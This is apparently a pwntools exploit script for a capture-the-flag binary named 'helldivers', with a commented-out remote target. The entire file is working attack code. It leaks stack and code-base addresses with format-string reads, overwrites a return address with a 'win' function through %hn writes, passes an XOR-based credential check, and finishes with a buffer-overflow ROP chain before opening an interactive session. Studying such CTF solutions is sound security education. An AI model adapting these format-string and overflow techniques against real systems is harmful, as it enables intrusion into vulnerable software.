#!/usr/bin/env python3

from pwn import *
from pwnlib.fmtstr import *

def my_divide(address, n):
    result = []
    for i in range(n):
        temp = []
        temp.append(address & 0xffff)
        temp.append(i*2)
        result.append(temp)

        address = address >> 16

    return sorted(result, key=lambda x: x[0])




def main():
    #r = remote("helldivers.martiansonly.net", 6666)
    byte_237f = b"\xE2\xAC\x87\x20\xE2\xAC\x86\x20\xE2\xAC\x87\x20\xE2\xAC\x86" #payload for deployObjective()


    r = process("./helldivers")
    
    #gdb.attach(r, gdbscript='''
    #    break *menu+0x1755
    #    ''')

    input()


    r.sendlineafter(b"Waiting on your call, helldiver >>> \n", b"%22$p")
    # good luck pwning :)
    leak = r.recvline()
    leak = r.recvline()
    log.success(leak)
    old_rbp_main = int(leak,16)
    log.success("rbp of main: "+hex(old_rbp_main))


    r.sendlineafter(b"Waiting on your call, helldiver >>> \n", b"%21$p")
    # good luck pwning :)
    leak = r.recvline()
    leak = r.recvline()
    log.success(leak)
    ret2_original = int(leak,16)
    log.success("ret2_original: "+hex(ret2_original))



    r.sendlineafter(b"Waiting on your call, helldiver >>> \n", b"%29$p")
    # good luck pwning :)
    leak = r.recvline()
    leak = r.recvline()
    log.success(leak)
    leak = int(leak, 16)
    code_base = leak + 0x000055708245b000 - 0x55708245c25c
    log.success("code base: "+ hex(code_base))

    r.sendlineafter(b"Waiting on your call, helldiver >>> \n", b"%37$p")
    leak = r.recvline()
    leak = r.recvline()
    gs_base = int(leak,16) - 0x35000 
    log.success(hex(gs_base))
    ret1 = gs_base +8
    win = code_base+0x19b7 #0x19b7

    r.sendlineafter(b"Waiting on your call, helldiver >>> \n", b"%25$p")
    leak = r.recvline()
    leak = r.recvline()
    ret2 = int(leak,16) + 0x20 

    log.success("ret2: "+hex(ret2))



    win_divide = my_divide(win, 3)
    print("win divide: ", win_divide)

    payload = f'%{win_divide[0][0]}c%14$hn'.encode()
    payload += f'%{win_divide[1][0]-win_divide[0][0]}c%15$hn'.encode()
    payload += f'%{win_divide[2][0]-win_divide[1][0]}c%16$hn'.encode()
    payload = payload.ljust(64, b"A")

    payload += p64(ret2+win_divide[0][1])
    payload += p64(ret2+win_divide[1][1])
    payload += p64(ret2+win_divide[2][1])

    r.sendlineafter(b"Waiting on your call, helldiver >>> \n", payload)


    r.sendlineafter(b"Waiting on your call, helldiver >>> \n", byte_237f)


    log.success("gsbase: " + hex(gs_base))


    


    x = gs_base ^ ret1
    print("x = ", hex(x))
    log.success("gs need write: " + hex(gs_base^0x1337^0x1337^x))

    r.sendafter(b"today?", p64(x^0x1337))


    r.sendafter(b"credentials:", p64(win))


    r.sendlineafter(b"Waiting on your call, helldiver >>> \n", b"Quit")

    #r.interactive()

    ret = code_base+0x1016

    new_payload = b"A"*0x78 + p64(ret2) + p64(old_rbp_main) + p64(ret)+p64(win)
    r.sendlineafter(b"back home? >>> ", new_payload)

    r.interactive()
    


if __name__ == "__main__":
    main()
